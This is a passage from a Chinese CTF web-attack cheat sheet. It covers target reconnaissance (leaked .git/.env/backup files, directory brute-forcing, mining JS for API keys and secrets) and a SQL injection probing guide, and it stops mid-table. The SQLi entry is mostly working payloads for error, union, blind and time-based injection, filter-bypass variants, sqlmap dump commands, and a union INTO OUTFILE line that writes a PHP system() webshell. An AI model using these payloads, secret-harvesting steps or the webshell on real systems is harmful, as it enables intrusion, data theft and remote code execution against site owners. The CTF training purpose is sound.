## [recon] 信息收集速查——拿到靶机 / 题目后的标准起手式，按顺序快速过一遍。
### [rec-checklist] 信息收集 10 分钟清单 | easy | 信息收集;侦察;checklist | 信息收集清单;recon checklist;打点流程
> 从拿到 URL 到开始攻击的完整检查顺序
#### 这个条目的作用
拿到一个靶机 URL 后，最容易犯的错是「直接开扫」或「对着登录页死磕」。这份清单把 10 分钟内的检查顺序固定下来：先看完页面本身（源码、注释、JS、隐藏入口），再按 robots → 响应头 → 目录扫描 → 源码泄露 → JS 分析 → 功能点 → 参数 fuzz → 端口 → 后台路径的顺序过一遍。多数 CTF Web 题的 flag 入口就藏在前 4 步里，按顺序走能避免漏掉「送分线索」。
#### 前置条件
- 一个可访问的靶机 URL（形如 `http://1.2.3.4:8080/` 或 `http://target.com/`），浏览器能打开。
- 本机有 `curl`、`python3`；目录扫描工具任选其一（dirsearch / ffuf / gobuster，见 `rec-dirbrute`）。
- 一个终端（Linux/macOS 的 bash，或 Windows 的 git-bash / WSL 均可）。

> [!tip] 全程把「看到什么算成功」记下来：每个检查都问自己——这个结果对我下一步攻击有什么用？没用就跳过，别在无产出步骤上耗时间。
#### 第 1 步：看页面本身
打开浏览器访问首页，按 `F12` → Sources / Elements，看三样东西：
1. 页面源码里的 `<!-- 注释 -->`（经常直接写提示、备份路径、flag 线索）。
2. `<script src="...">` 引入的 JS 文件列表（把 URL 记下来，第 6 步用）。
3. 有没有隐藏 tab / 隐藏链接 / `view-source:` 里多出来的内容。

预期结果：你手里攒下一组「可疑路径 + JS 文件清单」。如果注释里直接出现 `/flag`、`admin.php`、`backup.zip` 之类，立刻访问，大概率白送。

如果不行：页面 502/403 → 先确认靶机是否已启动、URL 端口是否写对；页面空白 → 用 `curl -s http://target/ -i` 看响应头与状态码，别只看浏览器渲染结果。
#### 第 2 步：抓 robots.txt 与 sitemap.xml
```bash
curl -s http://target/robots.txt
curl -s http://target/sitemap.xml
```
预期结果：`robots.txt` 里 `Disallow:` 的行经常直接暴露后台路径（如 `/admin/`、`/backup/`），`sitemap.xml` 列出全部公开页面。
如果不行：返回 404 或空内容是常态，别纠结，直接进入第 3 步。
#### 第 3 步：看 HTTP 响应头
```bash
curl -sI http://target/
```
预期结果：`Server`（nginx/apache/tomcat）、`X-Powered-By`（PHP/ASP.NET/Express）、`Set-Cookie`（PHPSESSID / JSESSIONID / 自定义 token）暴露技术栈，决定你后面用哪套 payload。
如果不行：响应头被 CDN/WAF 抹掉常见，不影响后续步骤。
#### 第 4 步：目录扫描
```bash
python3 dirsearch.py -u http://target/ -e php,txt,html,zip,bak,sql
```
预期结果：扫出 `/admin`、`/upload`、`/backup.zip`、`/api` 等目录与文件，逐个访问确认。
如果不行：全是 404 或假 200，换字典重扫（先用小字典，无果再上大字典），并配合 `rec-dirbrute` 的 `-fs` 过滤。
#### 第 5 步：源码泄露探测
```bash
for f in robots.txt sitemap.xml .git/config .svn/entries .DS_Store .env backup.zip www.zip flag.txt; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/$f); echo "$code $f"; done
```
预期结果：某行返回 `200`。其中 `.git/config` 返回 200（内容含 `[core]`）是重大发现——整站源码泄露，处理方法见 `rec-common-files`。
如果不行：全 404 正常，进入第 6 步。
#### 第 6 步：JS 分析
把第 1 步记录的 JS 文件全部下载到本地，全文搜敏感词：
```bash
curl -s http://target/ | grep -oE '"[^"]*\.js"' | sort -u
grep -rniE 'apiKey|secret|token|password|admin|/api/|flag' js/
```
预期结果：发现接口路径（`/api/admin`）、密钥或 flag。详细流程见 `rec-jsrecon`。
如果不行：页面没引 JS → 跳过，进入第 7 步。
#### 第 7 步：功能点枚举与参数 fuzz
把页面每个表单、每个 GET 参数记下来：登录、注册、上传、搜索、下载、翻页…… 只要 URL 里有参数（`?id=`、`?file=`、`?page=`），就试常见参数名：`id file url path cmd page redirect target next name`。
```bash
ffuf -u 'http://target/index.php?FUZZ=1' -w params.txt -mc 200,302 -fs 0
```
预期结果：找到能影响响应/报错的参数 → 这就是漏洞探测对象（SQLi 见 `probe-sqli`，XSS 见 `probe-xss`）。
#### 第 8 步：补端口与常见后台路径
如果上面全没收获：`nmap -sV -p- http://target/` 看全端口（Web 常见 80/8080/8888/8000/3000/5000/9000/8081）；再直接访问一遍 `/admin /login /manage /console /phpmyadmin /api /swagger-ui.html /actuator /adminer`。
> [!warn] 有的题信息藏在「新手引导」「管理接口」里。先全文检索页面所有 `<script src>` 的 JS，再开始爆破——JS 里的接口名往往就是后台路径。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 首页看着正常但啥线索都没有 | 线索在 JS / 备份文件 / 更深层目录里 | 别停在第 1 步，强制过完 2–7 步 |
| robots.txt 和 sitemap 全 404 | 没配，正常 | 跳过，不耗时间 |
| 目录扫描全是假 200（页面是同一张 404） | 框架统一 404 响应 | 用 `-fs` 按响应大小过滤（`rec-dirbrute`） |
| 忘记了某步的产出 | 凭记忆瞎打 | 每步把「发现了什么 + 下一步打哪」写进笔记 |
| 端口扫半天没服务 | 只扫了 80 | `nmap -p-` 全端口，注意 8000–10000 的常见 Web 端口 |
#### 实战要点
1. 顺序即产出：前 4 步是「送分区」，80% 的 Web 题 flag 路径在这几步内暴露。
2. 注释 ≠ 无用：`<!-- TODO: 删除后台 /backup/admin.php -->` 这种注释就是高价值线索。
3. JS 是全队最容易漏的：打包后的 JS 里接口、密钥、签名逻辑全在，务必下载全文搜。
4. 参数 fuzz 用 `rec-dirbrute` 的 ffuf 一行模板，别用手点几十个参数。
5. 每个 200 结果都要**实际访问确认内容**，状态码 200 ≠ 有价值。
6. 记录所有「可疑但没打动」的路径，第 8 步的端口与后台路径扫描之后回头再试。
### [rec-common-files] 敏感文件与备份文件速查 | easy | 信息收集;源码泄露;备份文件 | 敏感文件;备份泄露;.git;.DS_Store;.env
> 常见可直接访问的泄露文件清单
#### 这个条目的作用
Web 目录里常躺着「本不该被访问」的文件：版本控制目录、备份压缩包、环境变量文件、编辑器残留。它们一旦可访问，就是源码、数据库密码、后台入口甚至 flag 的直通车。本文按利用价值从高到低列出清单，并给出批量探测命令与 `.git` 泄露的恢复方法。
#### 前置条件
- 靶机 URL 可访问；本机有 `curl`、`python3`。
- 能联网下载 GitHub 工具（GitHack / GitHacker），或题目环境允许直接访问 `.git/`。

> [!danger] 判断 `.git` 是否泄露的标准姿势：`curl -sI http://target/.git/HEAD`，返回 200 且内容含 `ref:` 即为泄露；若只是 301/403 则多半只是「目录存在被拦截」，可换 `.git/config` 再试。
#### 第 1 步：批量探测高频文件
把下面清单里的文件逐个 HEAD 一遍，看哪些返回 200：
```bash
for f in .git/config .svn/entries .DS_Store .env .env.bak backup.zip bak.zip www.zip site.zip db.sql data.sql config.php.bak config.php~ index.php.swp phpinfo.php info.php .htaccess crossdomain.xml swagger-ui.html api-docs actuator actuator/env flag.txt flag.php; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/$f); echo "$code $f"; done
```
预期结果：输出里出现一列 `200`。逐个 `curl http://target/<文件>` 看内容，按价值排序处理（见下表优先处理规则）。
如果不行：全部 404，说明没开「考古题」；直接看第 5 步的接口文档探测。
#### 第 2 步：处理 .git 源码泄露（最高价值）
```bash
# 1. 确认
curl -s http://target/.git/HEAD
# 期望输出形如: ref: refs/heads/master

# 2. 用工具一键还原（任选其一，先试 GitHack）
python3 GitHack.py http://target/.git/
# 或 GitHacker:
python3 githacker.py --url http://target/.git/ --output-folder ./out
```
预期结果：当前目录出现还原出的完整源码树（`index.php`、`config.php` 等）。`git log`、`git diff` 还能翻历史版本——**flag 经常在旧 commit 里被删除前的版本中**。
如果不行：工具报错或还原不全（常见于服务器禁了部分端点）→ 手动思路：能访问 `.git/index` 就有戏，用 dvcs-ripper（`./rip-git.pl -u http://target/.git/`）兜底。
#### 第 3 步：处理 .env 与备份包
```bash
curl -s http://target/.env
curl -s http://target/backup.zip -o backup.zip && unzip -l backup.zip
```
预期结果：`.env` 里通常有 `DB_PASSWORD`、`APP_KEY`、`JWT_SECRET` 等——直接拿去连数据库/登录后台；`backup.zip` 解压出整站源码 + 配置 + 可能连 `.git` 一起打包。
如果不行：压缩包下载下来 404 或 0 字节 → 换常见备份名重试：`web.zip site.zip old.zip test.zip 1.zip wwwroot.zip`，以及根目录 `index.php.bak`。
#### 第 4 步：编辑器残留与语言特定文件
```bash
for f in .index.php.swp index.php~ .config.php.swp config.php.bak .gitignore .svn/wc.db; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/$f); echo "$code $f"; done
```
预期结果：`*.swp`（vim 崩溃残留）下载后 `vim -r` 或直接 strings 能抠出源码；`*.php~`、`*.bak` 是编辑器备份，直接访问即源码明文。
如果不行：404 就跳过——该类文件靠运气，扫到了是惊喜。
#### 第 5 步：接口文档与监控端点
```bash
curl -s http://target/swagger-ui.html
curl -s http://target/v2/api-docs
curl -s http://target/actuator
curl -s http://target/actuator/env
```
预期结果：Swagger 直接列出**全部接口名、参数、请求方法**（相当于白送接口清单）；Spring Actuator 的 `/actuator/env` 泄露环境变量、`/actuator/heapdump` 甚至能拖内存快照找密钥。
如果不行：404 说明不是 Spring 应用或不带监控，跳过。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `.git/HEAD` 返回 301/403 | 目录存在但被服务器规则拦截 | 试 `.git/config`、`.git/index`、`.git/logs/HEAD`；被反代拦截时换工具或手动拼 |
| 备份包下载了但解压失败 | 文件名对但内容被中间层改写 | `file backup.zip` 看真实类型（可能伪装成图片/HTML） |
| `.env` 内容一堆 `***` | 平台脱敏/附带了演示值 | 换 `.env.local`、`.env.production`、`config/env.php` 再试 |
| 还原的源码不全 | 工具只支持部分协议 | GitHack → GitHacker → dvcs-ripper 逐个换 |
| 一堆 200 但访问全是同一首页 | 服务器对所有路径返回 200 | 对比响应体大小（`curl -s -o /dev/null -w '%{size_download}' URL`），只盯与众不同的 |
#### 实战要点
1. 优先级：`.git` > `.env` > 备份包 > 编辑器残留 > swagger/actuator，先处理前三个。
2. `.git` 泄露记得翻**历史 commit**，flag 常在被删除的旧版本文件里。
3. `.DS_Store` 泄露的是文件名列表：`python3 ds_store_exp.py http://target/.DS_Store` 可枚举目录结构。
4. `phpinfo.php` 泄露完整配置（含 `open_basedir`、扩展列表），决定你能不能打伪协议/反序列化。
5. 下载到的任何 `.zip`/`.sql` 先解压再看，别只看文件名。
6. 探测列表可以复用 `rec-checklist` 第 5 步的 for 循环，与清单合并成一条大命令。
### [rec-dirbrute] 目录爆破速查命令 | easy | 信息收集;目录扫描;爆破 | dirsearch;gobuster;ffuf;目录扫描
> dirsearch / ffuf / gobuster 一行命令模板
#### 这个条目的作用
目录爆破是「没线索时找线索」的主力手段：把字典里的路径挨个请求靶机，找出真实存在的后台、备份、上传、接口目录。本文给出 dirsearch / ffuf / gobuster 三个工具的一行命令模板，以及字典选择和「假 200」过滤方法。
#### 前置条件
- 靶机 URL 可访问；本机已安装至少一个工具：`pip install dirsearch`（或 clone 仓库 `python3 dirsearch.py`）、`go install github.com/ffuf/ffuf/v2@latest`、`apt install gobuster` 任选。
- 一个小字典文件（如 `dirsearch/db/dicc.txt`、`SecLists/Discovery/Web-Content/common.txt`）。

> [!info] 线下赛默认字典优先用**小字典**（速度快、命中率高）：常见后台名、备份名、文件名。大字典留给无果时第二轮。
#### 第 1 步：确认没扫错目标
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://target/
```
预期结果：返回 200（或目标正常状态码）。注意确认是否带了**子路径**（如 `http://target/app1/`），有些题 Web 根目录在子路径下。
如果不行：403/404 或超时 → 先解决连通性问题（题目端口、host 解析）再爆破，否则整轮扫描全是噪音。
#### 第 2 步：dirsearch 三连（最常用）
```bash
# 基础：指定扩展名
python3 dirsearch.py -u http://target/ -e php,txt,html,zip,bak,sql

# 指定字典、并发、排除 403/404
python3 dirsearch.py -u http://target/ -w dict.txt -t 50 -x 403,404

# 全面扫（默认字典 + 所有扩展）
python3 dirsearch.py -u http://target/ -e *
```
预期结果：彩色输出里、`[200]` 的行就是要访问的目标；`[301]`（目录跳转）也记下来，往往指向子目录。
如果不行：全是 `[403]` → 目录存在只是被拒，换个思路（猜测文件名而不是目录）；扫描太慢 → 加 `-t 100` 提并发，或换小字典。
#### 第 3 步：ffuf（更快、可多位置 fuzz）
```bash
# 路径爆破，只看 200/301/302
ffuf -u http://target/FUZZ -w dict.txt -mc 200,301,302 -t 64

# 同时 fuzz 参数名（?FUZZ=1）
ffuf -u 'http://target/index.php?FUZZ=1' -w params.txt

# 用 -fs 排除固定大小响应（假 200 过滤，见下）
ffuf -u http://target/FUZZ -w dict.txt -fs 1234
```
预期结果：`FUZZ: admin` 之类命中项（状态码在 `-mc` 白名单内且大小不等于 `-fs` 值）。
如果不行：命中太多/太少 → 调 `-mc`（默认只显示 200-299，加 301/302 能发现目录跳转）或 `-fs`；参数名 fuzz 时注意原本就要带参数名固定值（如 `?id=FUZZ` 是测参数值，`?FUZZ=1` 才是测参数名）。
#### 第 4 步：gobuster（老牌、简单）
```bash
gobuster dir -u http://target/ -w dict.txt -x php,txt,bak -t 50
```
预期结果：与 dirsearch 类似输出命中路径。gobuster 适合没装 Python 工具链的环境，`-x` 指定附加扩展名。
如果不行：响应被 WAF 拦（大量 429/403）→ 加 `--delay` 降速，或换 ffuf 加 `-rate`。
#### 第 5 步：过滤假 200（关键）
框架类站点对任意路径都返回同一张 404 页，但状态码是 200——此时爆破结果全是「假命中」。对策：
```bash
# 先看一张 404 页的大小（假设是 1234 字节）
curl -s http://target/nonexistent12345 | wc -c

# ffuf 过滤该大小
ffuf -u http://target/FUZZ -w dict.txt -fs 1234
# dirsearch 以 --minimal/--maximal 或对比长度过滤
python3 dirsearch.py -u http://target/ -w dict.txt --maximal 1300
```
预期结果：假命中消失，剩下的才是真目录。
如果不行：404 页面大小不稳定（含随机 token）→ 改用内容指纹过滤：`ffuf -fc 404` 配合 `-fr 'Not Found|404'`（正则排除命中内容）。
> [!tip] 看到 200 但页面是同一张「404 首页」时，用 `-fs`（filter size）把相同内容的响应过滤掉，避免被假 200 干扰。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 扫描结果全是假 200 | 框架统一返回 200+404 页 | `-fs` 按大小过滤（第 5 步） |
| 工具连不上靶机 | 靶机限速 / 断连 | 降 `-t`/`--delay`，或分目录扫 |
| 小字典没命中 | 字典缺题目自定义路径 | 换大字典第二轮；结合 `rec-jsrecon` 从 JS 里提取路径手动加 |
| 命中 301 但访问 404 | 目录跳转带走了路径 | 跟随 `Location` 头访问 `/admin/`（带尾斜杠） |
| WAF 疯狂拦截 | 并发太高触发防护 | `-t 10 -rate 50` 慢速扫，或换被动方式（JS/robots 分析） |
#### 实战要点
1. 第一轮永远用小字典：速度快，后台/备份/上传目录这类常见命名命中率极高。
2. 目录命中和文件命中要分开看：`/upload/` 是入口，`/backup.zip` 是直接结果，价值不同。
3. 中文站点加试拼音目录：`guanli`、`houtai`、`upload`、`beifen`。
4. 爆破目录前先做 `rec-checklist` 第 1-6 步，JS 里的路径能直接喂给字典前缀，省大量时间。
5. 遇到上传点目录（`/upload`）爆完记得访问里面**已知文件名**，确认解析与直接访问能力。
6. 所有工具用的都是同一个原理（字典×请求），换工具解决不了「字典不对」的问题——先想字典，再想工具。
### [rec-jsrecon] JS 分析与接口提取 | medium | 信息收集;JS分析;前端审计;密钥提取 | js分析;sourcemap;接口提取;jsfind
> 从 JS 文件中提取接口、密钥、加密逻辑的方法
#### 这个条目的作用
现代前端把「接口路径、管理员接口、AppKey/AppSecret、加密算法、签名逻辑、隐藏功能路由」全部写在 JS 里。对 JS 做一次系统分析，等于拿到一份「后端接口地图」——**CTF 里经常直接藏 flag 或后台跳转**；即使没有，接口清单也是越权（IDOR）、认证绕过、参数注入的弹药库。
#### 前置条件
- 靶机页面可打开；本机有 `curl`、`grep`，最好有 `python3`（source map 还原用）。
- 浏览器 DevTools 基础操作（F12 → Network）。

> [!warn] 分析対象是**所有被引用的 JS**：页面里 `<script src>` 的、动态加载的（chunk-*.js）、以及 CDN 上的业务 JS——全部拉下来，别只看一个 `app.js`。
#### 第 1 步：收集页面里所有 JS 文件 URL
```bash
curl -s http://target/ | grep -oE '<script[^>]+src="[^"]+"' | grep -oE 'src="[^"]+"'
# 或者更宽松（抓所有 .js 路径）：
curl -s http://target/ | grep -oE '"[^"]*\.js"' | sort -u
```
预期结果：列出一堆 JS 路径，如 `"/static/js/app.js"`、`"/assets/chunk.abc123.js"`。若页面是 SPA（Vue/React），会有几十个 chunk 文件。
如果不行：grep 没输出 → 页面 JS 在登录后才加载，先去登录/注册一个账号再抓；或用浏览器 F12 → Network → 过滤 `JS`，逐个记录。
#### 第 2 步：批量下载到本地
```bash
mkdir -p js && curl -s http://target/ | grep -oE '(src|href)="[^"]*\.js"' | cut -d'"' -f2 | while read u; do
  curl -s "http://target$u" -o "js/$(basename $u)"; done
ls -la js/
```
预期结果：`js/` 目录下躺着一堆 `.js` 文件。下载后 `du -sh js/` 看总量——几十 MB 的打包文件里信息量巨大。
如果不行：文件名太长/带查询串导致保存失败 → `basename` 前先 `cut -d'?' -f1` 去查询串；下载 403 → 带上 `Referer` 头重试：`curl -s -H "Referer: http://target/" URL`。
#### 第 3 步：全文搜索敏感内容
```bash
grep -rniE 'apiKey|appKey|secret|token|password|admin|/api/|flag|key=' js/

# 提取所有接口路径
cat js/*.js | grep -oE '"/(api|admin|v[0-9])/[^" ]*"' | sort -u

# 提取外链与第三方接口
cat js/*.js | grep -oE 'https?://[^"'"'"']+' | sort -u
```
预期结果：得到三张清单——①密钥类（`appKey`、`appSecret`、`token` 常量）；②接口路径（`/api/admin/users` 等）；③第三方域名。接口清单直接拿去访问：很多「前端隐藏」的接口后端并不鉴权。
如果不行：grep 结果为空 → 代码被压缩成一行也很正常，别用 `grep -n` 数行号，直接看匹配内容；还不行就换关键词（`axios`、`fetch(`、`request(`、`url:`）。
> [!tip] 浏览器 F12 → Network → 过滤 `JS`，逐个看；关键词搜 `ajax`/`fetch(`/`axios`/`XMLHttpRequest` 定位请求构造点，能反推每个接口的完整参数。
#### 第 4 步：Source Map 还原（webpack 打包时）
```bash
# 找 .js.map：直接猜常见路径，或看 JS 末尾注释
curl -s http://target/js/app.js | tail -c 200
# 期望看到: //# sourceMappingURL=app.js.map
curl -s http://target/js/app.js.map -o app.js.map

# 还原（任选一种）
npx source-map-explorer js/app.js
python3 -m pip install sourcemap
python3 -c "import sourcemap; print(sourcemap.discover(sourcemap.load('app.js.map')))"
```
预期结果：还原出**接近原始写法的源码**（变量名、注释、模块结构都在），接口与逻辑一目了然。
如果不行：`.js.map` 404 常见（发布时删了 map）→ 退回到第 3 步的字符串搜索；`sourcemap.discover` 输出为空 → 用 `npx source-map-visualizer` 或浏览器 DevTools → Sources 面板（能自动加载同目录 map）。
> [!warn] 还原出的源码里常能找到**前后端交互接口全集**，配合越权/认证绕过使用价值极高。
#### 第 5 步：前端加密 / 签名逻辑绕过
网站把加密、签名、参数拼装全做在前端时，**别去逆向后端**，直接复用前端逻辑：
1. 在 JS 里找到加密函数（搜 `md5`、`sha1`、`base64`、`encrypt`、`sign`、`timestamp`）。
2. 复制该函数到本地 `node` 里跑，或直接在浏览器 Console 调用（页面已加载该函数）。
3. 请求前在 DevTools → Sources 打断点，看加密参数从哪来（哪个变量、哪个函数产出）。
预期结果：你能独立算出「合法」的签名/加密参数，绕过校验或伪造请求。
如果不行：加密逻辑被引入到独立 SDK（如微信支付 sdk）→ 直接在浏览器里正常触发一次请求，抓包复制完整参数，再改业务字段。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 只看了 `app.js` 漏掉 chunk | 懒加载 JS 没在首页 | 刷新页面并点击所有功能后再抓；包名含 `chunk`/`module` 的都下 |
| JS 是压缩成一行的 | webpack 产物正常 | 用 `npx js-beautify` 美化后再 grep，或直接用正则抓串 |
| 接口路径提取到一堆 `undefined` | 路径是变量拼接的 | 搜 `concat`/模板字符串 `` ` `` /`+` 附近的字符串常量 |
| sourcemap 404 | 发布时删了 map | 退回首搜；或检查 `/* webpackChunkName */` 注释里公开的 chunk 名 |
| **密钥提取到但不知道用哪** | 密钥对应第三方服务 | 结合接口路径判断：`/api/oss` 用 OSS key，`/pay` 用支付 key，逐个试 |
#### 实战要点
1. 接口路径清单是**最高产出**：直接访问 `GET /api/admin/users`，没鉴权就是白送数据。
2. 密钥先不要乱用：确认它对应哪个服务（OSS/短信/支付）再试，乱打会打草惊蛇。
3. 加密/签名逻辑在 JS 里一定能找到实现——前端代码对用户是透明的，这是它能被绕过的根本原因。
4. 浏览器 Console 里能直接调页面加载的加密函数，比 node 复刻快一个数量级。
5. JS 里出现的 `flag` 字符串直接抄；出现 `admin` 的路径、注释（`// TODO 鉴权`）都是线索。
6. 做完本条目，把接口清单同步给 teammate 测越权与认证绕过（`auth-access-control` 方向）。
## [probe] 漏洞探测 Payload 速查——遇到功能点先打一发探测 payload，确认漏洞类型再深入。
### [probe-sqli] SQL 注入快速探测 | easy | SQL注入;探测;payload | sql探测;注入检测;union select
> 判断参数是否存在 SQL 注入，并在确认后一路枚举库表拿到 flag 的完整链路
#### 这个条目的作用
拿到一个带参数的功能点（`?id=`、`?name=`、搜索框、登录框）后，先证明「它到底是不是 SQL 注入」，再决定深入方向。本文给出由轻到重的完整验证链：单引号报错 → 恒真恒假 → 注释符 → 报错注入 → 联合注入 → 布尔盲注 → 时间盲注，以及无空格绕过写法。
#### 前置条件
- 一个带参数的请求，形如 `http://target/index.php?id=1`；HTTP 请求可用浏览器地址栏或 Burp Repeater 发送。
- 目标参数**参与了数据库查询**才有戏：`id`、`name`、`page`、搜索框、登录用户名/密码都是典型对象。
- 理解一个前提：注入点写在 URL 里特殊字符要 URL 编码（浏览器会自动处理 `'` `#` 等）；建议用 Burp Repeater 发请求，避免编码干扰。

> [!danger] 探测顺序固定为：报错 → 恒真假 → 联合 → 盲注。时间盲注放最后（慢）。全部失败再考虑宽字节、编码绕过或二次注入。
#### 第 1 步：单引号报错
把参数值改成一个单引号，观察响应变化：
```text
http://target/index.php?id=1'
```
预期结果（任一即「有戏」）：页面报 SQL 语法错误（`You have an error in your SQL syntax`）、页面空白、500 错误、或与 `id=1` 的正常页明显不同。
如果不行：响应和 `id=1` 一模一样 → 说明单引号被转义或参数不参与拼接，进入第 2 步用恒真假判断。
#### 第 2 步：恒真恒假对比（最关键的一步）
构造两条几乎相同的请求，只有条件值不同：
```text
http://target/index.php?id=1' and '1'='1     -- 预期: 正常页面
http://target/index.php?id=1' and '1'='2     -- 预期: 异常/空白/不同
```
预期结果：第一条正常、第二条异常 → **注入点确认成立**，参数被拼进 SQL 了。
如果不行：两条响应完全一样 → 单引号进不了 SQL（被转义/参数化）；但仍可测**数字型注入**：直接 `?id=1 and 1=1` vs `?id=1 and 1=2`，若不同样成立则无需引号。
#### 第 3 步：注释符收尾
注入后要「吃掉」原 SQL 尾巴，注释符因数据库而异，逐个试：
```sql
-- -     --+    #    /* */    ;%00
-- 后面要有空格（-- 后必须跟空格/换行，写 -- - 最稳）
```
```text
http://target/index.php?id=1' -- -
http://target/index.php?id=1' --+
http://target/index.php?id=1' #
```
预期结果：加上注释符后页面恢复「正常」——说明注释生效，注入语句的尾部已被正确处理，可以放心拼复杂 payload。
如果不行：`-- -` 无效就试 `#`（MySQL 常用）或 `;%00`（PHP+MySQL 老版本）；在 Burp 里用 `%23` 代替 `#`。
#### 第 4 步：报错注入（有报错回显时，速度最快）
把目标函数放进报错表达式，让数据库把结果拼进错误信息吐出来（MySQL）：
```sql
' and updatexml(1,concat(0x7e,version()),1)-- -
' and extractvalue(1,concat(0x7e,database()))-- -
' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```
```text
http://target/index.php?id=1' and updatexml(1,concat(0x7e,database()),1)-- -
```
预期结果：错误信息里出现 `~数据库名~`（`0x7e` 即 `~`，用于标记边界）。把 `database()` 换成 `user()`、`@@version`、子查询可逐步提数据。
如果不行：报错信息不显示或 WAF 拦截报错函数 → 换恒真假/盲注路线。
#### 第 5 步：联合注入找列数（有回显且列数少时）
```sql
' order by 10-- -      -- 报错即超出列数，二分从大往小试
' order by 5-- -       -- 不报错就一直加大，找到临界值 N
' union select 1,2,3,4-- -   -- 用 N 个占位符
```
```text
http://target/index.php?id=-1' union select 1,2,3,4-- -
```
预期结果：`order by N` 在列数≤N 时不报错、`N+1` 报错 → 列数是 N；`union select 1,2,3,...,N` 后页面出现数字「2」「3」等回显位，把对应占位符换成 `database()`、`group_concat(table_name)` 即可拖库。
如果不行：没有回显位（页面不输出数字）→ 转盲注；注意 `id=-1` 用负值或 `and 1=2` 让原查询无结果，union 部分才显示。
#### 第 6 步：布尔盲注（无回显但响应有差异时）
页面只有「正常/异常」两种状态时，逐字符猜：
```sql
1' and if(ascii(substr(database(),1,1))>100,1,0)-- -   # 二分法，响应正常则成立
1' and (select ascii(substr(database(),1,1)))=100-- -   # 精确比较
```
预期结果：依据响应正常/异常判断条件真假，二分逼近字符的 ASCII 码，逐位拼出库名/表名。用脚本（Burp Intruder 或 Python requests）自动化。
如果不行：响应永远一样（可能被 WAF 统一返回）→ 转时间盲注。
#### 第 7 步：时间盲注（无任何回显差异时，放最后）
```sql
1' and sleep(5)-- -                                  # MySQL
1'; SELECT pg_sleep(5)-- -                            # PostgreSQL
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -         # Oracle
1' WAITFOR DELAY '0:0:5'-- -                          # MSSQL
```
```text
http://target/index.php?id=1' and sleep(5)-- -
```
预期结果：请求**延迟约 5 秒**返回 → 注入成立且可用时间做条件判断（`if(condition,sleep(5),0)` 二分）。
如果不行：不延迟 → 数据库不是 MySQL 或注入点不成立；`sleep` 被禁时试 `benchmark(10000000,sha1('x'))`。
#### 第 8 步：无空格 & 关键字符绕过（被过滤时）
```sql
1'/**/or/**/1=1-- -          # /**/ 替代空格
1'%0aor%0a1=1-- -            # %0a 换行（常用于 http 参数）
1'||1=1-- -                  # || 逻辑或（PG/SQLite/Oracle/MySQL 默认关）
1' AND 1=1 AND (3=3) AND 1-- - # 括号分隔
```
预期结果：空格被过滤的站点上仍能成立条件。绕过思路：`/**/`→注释替代，`%0a`→换行，`\t`→制表符，反引号包裹表名。
如果不行：连 `or`/`and` 都被过滤 → 这是 WAF 级对抗，进入 `waf-bypass-techniques` 方向系统测试。
#### 第 9 步：探测通过后，确定注入类型与数据库（决定用哪条提取路线）
注入确认后别急着拖库，先回答两个问题：**什么类型的注入**（报错 / 联合 / 布尔 / 时间）、**什么数据库**（MySQL / MSSQL / Oracle / PG）。库类型决定注释符、版本函数和不等价语法：
```sql
' and updatexml(1,concat(0x7e,version()),1)-- -   # 报错回显里带 MariaDB/MySQL 版本
' union select 1,@@version,3-- -                  # union 直接打版本
```
| 数据库 | 版本函数 | 注释符 | 特有语法 |
|---|---|---|---|
| MySQL | version() / @@version | -- - / # | limit、concat、group_concat |
| MSSQL | @@version | -- | top、waitfor delay、db_name() |
| Oracle | banner（v$version） | -- | dual、rownum、`\|\|` 拼接 |
| PostgreSQL | version() | -- | `::`类型转换、current_database() |
预期结果：能说出「MySQL 数字型、有报错回显、列数 4」这类完整结论 → 按库类型选第 10 步的 payload。
如果不行：分不清库类型就先按 MySQL 语法试（CTF 占比最高，报错/联合/盲注套路通吃）。
#### 第 10 步：order by 定列数 + union 一把梭枚举库表列（有回显最快）
```sql
' order by 1-- -                       # 逐个加大，报错即超出 → 得到列数 N
' union select 1,2,3-- -               # 用 N 个占位符，找出回显位
' union select 1,database(),3-- -      # 库名
' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- -
' union select 1,group_concat(flag),3 from users-- -
```
预期结果：库名 → 表名 → 列名 → 数据依次吐出，flag 直接到手。
如果不行：union 不回显（没回显位）→ 走第 11 步盲注；回显被截断就用 `limit 0,1` 一行行取，别一次 concat 太多。
#### 第 11 步：无回显 → 布尔/时间盲注逐字符提取（或直接上 sqlmap）
```sql
1' and ascii(substr((select group_concat(flag) from users),1,1))=102-- -   # 布尔盲注逐字符
1' and if(ascii(substr((select database()),1,1))>100,sleep(3),0)-- -       # 时间盲注二分
```
手工思路验证通后，提取交给 sqlmap（探测已确认，直接进提取阶段）：
```bash
sqlmap -u "http://target/index.php?id=1" --batch --dbs
sqlmap -u "http://target/index.php?id=1" -D 库名 --tables
sqlmap -u "http://target/index.php?id=1" -D 库名 -T 表名 --dump
```
预期结果：拿到 flag 所在表的数据。
如果不行：sqlmap 被 WAF 拦 → 加 `--tamper=space2comment` 等、`--level=3` 换注入点，或回到第 8 步手工绕过。
#### 第 12 步：数据库里没有 flag → 读文件 / 写 shell（MySQL 且有 FILE 权限）
```sql
' union select 1,load_file('/flag'),3-- -                     # 读文件
' union select 1,load_file('/var/www/html/flag.txt'),3-- -    # 常见 flag 位置
' union select 1,'<?php system($_GET[c]);?>',3 into outfile '/var/www/html/s.php'-- -   # 写 webshell
```
```bash
# 拿下 shell 后直接搜
find / -name "*flag*" 2>/dev/null
```
预期结果：直接读出 flag 文本；或写入 webshell → RCE → 找 flag → 提权。
如果不行：load_file 返回 NULL → 无 FILE 权限或 `secure_file_priv` 限制，确认 league 里 flag 是否本就在库中（第 10/11 步），或换注入点/换入口。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 单引号报错但 `and '1'='1` 无差异 | 引号被转义，但数字型注入可能存在 | 直接测 `?id=1 and 1=1`（不带引号） |
